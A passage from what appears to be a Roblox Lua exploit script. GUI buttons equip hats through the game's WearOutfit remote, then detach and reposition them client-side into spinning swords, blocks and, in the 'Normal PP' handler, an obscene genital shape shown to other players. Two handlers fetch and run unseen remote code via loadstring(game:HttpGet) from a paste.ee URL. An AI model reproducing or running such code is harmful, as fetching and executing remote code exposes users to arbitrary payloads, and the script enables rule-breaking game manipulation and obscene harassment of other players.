	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
end

part.Anchored = true
part.CanCollide = false
part.Size = Vector3.new(1,1,1)
part.Transparency = math.huge
changetog = true
startog = true

mouse = plr:GetMouse()

part.Position = Vector3.new(mouse.Hit.X, mouse.Hit.Y, mouse.Hit.Z)
mouse.Button1Down:connect(function()
part.Position = Vector3.new(mouse.Hit.X, mouse.Hit.Y, mouse.Hit.Z)
end)

local function change()
    if changetog == true then
        changetog = false
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        changetog = true
    end
end

local function star()
if startog == true then
startog = false
Zval.Value = 2.5
Xval.Value = -3
wait(.2)
Zval.Value = -6
Xval.Value = 0
wait(.2)
Zval.Value = 2.5
Xval.Value = 3
wait(.2)
Zval.Value = -2.5
Xval.Value = -4
wait(.2)
Zval.Value = -2.5
Xval.Value = 4
wait(.2)
startog = true
end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)

local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
	part:Destroy()
end
star()
for _, v in pairs(hum:GetAccessories()) do
local b = v.Handle;
    b.Orientation = Vector3.new(XvalO.Value, YvalO.Value, ZvalO.Value)
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end)

Script_5.Name = "Script"
Script_5.Parent = HatScripts
Script_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_5.Position = UDim2.new(-1.25, 0, 13, 0)
Script_5.Size = UDim2.new(0, 52, 0, 19)
Script_5.Visible = false
Script_5.Font = Enum.Font.SourceSans
Script_5.Text = "Sword Spin"
Script_5.TextScaled = true
Script_5.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_5.TextSize = 14.000
Script_5.MouseButton1Click:connect(function()
speen1 = 5
speen2 = 10
loadstring(game:HttpGet('https://paste.ee/r/HRAcR'))()  
    local habies = game.ReplicatedStorage.RemoteFunctions.WearOutfit

local code = "none"
local args = {
    Face = "";
    
    Hat1 = "4315489767";
    Hat2 = "4458601937";
    Hat3 = "4506945409";
    Hat4 = "4794315940";

    RemoveShirt = false;
    
    Pants = "";
    RPDesc = "";
    RPName = "";
    Shirt = "";
}

habies:InvokeServer(args)

local function sword1()
    -- Main Animation
-- Hat Position
local j = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
j.Name = "sword1"
local HAT = "sword1"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 2
Yval.Value = 4
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};


for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

spinToggle = true
local function spin()
    if spinToggle == true then
       spinToggle = false
       ZvalO.Value = ZvalO.Value -(speen2)
       spinToggle = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end 
	end
	end
end)


local function orie()
 game:GetService('RunService').Stepped:connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
spin()
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end
end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function sword2()
    -- Main Animation
-- Hat Position
local j = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
j.Name = "sword2"
local HAT = "sword2"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 1
Yval.Value = 4
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

spinToggle = true
local function spin()
    if spinToggle == true then
       spinToggle = false
       ZvalO.Value = ZvalO.Value +(speen1)
       spinToggle = true
    end
end
local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end 
	end
	end
end)


local function orie()
 game:GetService('RunService').Stepped:connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
spin()
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end
end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function sword3()
    -- Main Animation
-- Hat Position
local j = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
j.Name = "sword3"
local HAT = "sword3"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -1
Yval.Value = 4
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

spinToggle = true
local function spin()
    if spinToggle == true then
       spinToggle = false
       ZvalO.Value = ZvalO.Value +(speen1)
       spinToggle = true
    end
end
local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end 
	end
	end
end)


local function orie()
 game:GetService('RunService').Stepped:connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
spin()
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end
end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function sword4()
    -- Main Animation
-- Hat Position
local j = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
j.Name = "sword4"
local HAT = "sword4"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -2
Yval.Value = 4
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

spinToggle = true
local function spin()
    if spinToggle == true then
       spinToggle = false
       ZvalO.Value = ZvalO.Value -(speen2)
       spinToggle = true
    end
end
local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end 
	end
	end
end)


local function orie()
 game:GetService('RunService').Stepped:connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
spin()
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end
end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function sword5()
        -- Main Animation
-- Hat Position
local j = game.Players.LocalPlayer.Character:FindFirstChild("BladeMasterAccessory")
j.Name = "sword1"
local HAT = "sword1"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 4
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

spinToggle = true
local function spin()
    if spinToggle == true then
       spinToggle = false
       ZvalO.Value = ZvalO.Value -(speen2)
       spinToggle = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end 
	end
	end
end)


local function orie()
 game:GetService('RunService').Stepped:connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
spin()
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end
end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

sword1()
sword2()
sword3()
sword4()
sword5()
end)

Script_6.Name = "Script"
Script_6.Parent = HatScripts
Script_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_6.Position = UDim2.new(2.63461542, 0, 13, 0)
Script_6.Size = UDim2.new(0, 52, 0, 19)
Script_6.Visible = false
Script_6.Font = Enum.Font.SourceSans
Script_6.Text = "Block Spin"
Script_6.TextScaled = true
Script_6.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_6.TextSize = 14.000
Script_6.MouseButton1Click:connect(function()
    local habies = game.ReplicatedStorage.RemoteFunctions.WearOutfit

local code = "none"
local args = {
    Face = "";
    
    Hat1 = "4315489767";
    Hat2 = "4458601937";
    Hat3 = "4506945409";
    Hat4 = "4794315940";

    RemoveShirt = false;
    
    Pants = "";
    RPDesc = "";
    RPName = "";
    Shirt = "";
}

habies:InvokeServer(args)

speen1 = 5
speen2 = 5

local function sword1()
    -- Main Animation
-- Hat Position
local j = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
j.Name = "sword1"
local HAT = "sword1"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 2
Yval.Value = 4
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

spinToggle = true
local function spin()
    if spinToggle == true then
       spinToggle = false
       ZvalO.Value = ZvalO.Value +(speen1)
       spinToggle = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end 
	end
	end
end)


local function orie()
 game:GetService('RunService').Stepped:connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
spin()
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end
end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function sword2()
    -- Main Animation
-- Hat Position
local j = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
j.Name = "sword2"
local HAT = "sword2"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 1
Yval.Value = 4
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

spinToggle = true
local function spin()
    if spinToggle == true then
       spinToggle = false
       ZvalO.Value = ZvalO.Value -(speen2)
       spinToggle = true
    end
end
local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end 
	end
	end
end)


local function orie()
 game:GetService('RunService').Stepped:connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
spin()
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end
end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function sword3()
    -- Main Animation
-- Hat Position
local j = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
j.Name = "sword3"
local HAT = "sword3"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -1
Yval.Value = 4
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

spinToggle = true
local function spin()
    if spinToggle == true then
       spinToggle = false
       ZvalO.Value = ZvalO.Value +(speen1)
       spinToggle = true
    end
end
local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end 
	end
	end
end)


local function orie()
 game:GetService('RunService').Stepped:connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
spin()
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end
end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function sword4()
    -- Main Animation
-- Hat Position
local j = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
j.Name = "sword4"
local HAT = "sword4"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -2
Yval.Value = 4
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};


for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

spinToggle = true
local function spin()
    if spinToggle == true then
       spinToggle = false
       ZvalO.Value = ZvalO.Value -(speen2)
       spinToggle = true
    end
end
local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end 
	end
	end
end)


local function orie()
 game:GetService('RunService').Stepped:connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
spin()
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end
end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

sword1()
sword2()
sword3()
sword4()
end)

Script_7.Name = "Script"
Script_7.Parent = HatScripts
Script_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_7.Position = UDim2.new(0, 0, 13, 0)
Script_7.Size = UDim2.new(0, 52, 0, 19)
Script_7.Visible = false
Script_7.Font = Enum.Font.SourceSans
Script_7.Text = "Normal PP"
Script_7.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_7.TextSize = 14.000
Script_7.MouseButton1Click:connect(function()
    local habies = game.ReplicatedStorage.RemoteFunctions.WearOutfit
--|| Settings:
local NetEnabled = true -- Keep this on true or this script is basically useless
--|| Script Loadstring:
loadstring(game:HttpGet('https://paste.ee/r/HRAcR'))()  
local code = "158066212"
local args = {
    Face = "";
    
    Hat1 = "3810500963";
    Hat2 = "4822592866";
    Hat3 = "4911305457";
    Hat4 = "17614451";
    Hat5 = "5355792614";
    Hat6 = "17877340";

    RemoveShirt = false;
    
    Pants = "";
    RPDesc = "";
    RPName = "";
    Shirt = "";
}


habies:InvokeServer(args)


local function penis_Shaft()
    -- Main Animation
-- Hat Position
local HAT = "Meshes/QuadStack_FBXAccessory"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
 game:GetService('RunService').Stepped:connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end
end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function penis_Left_Ball()
    -- Main Animation
-- Hat Position
local HAT = "MarsPet"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -.4
Yval.Value = -3
Zval.Value = -1

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {}

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game:GetService('RunService').Stepped:connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end
end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function penis_Right_Ball()
    -- Main Animation
-- Hat Position
local HAT = "Uranus"
local Xval = Instance.new("NumberValue")
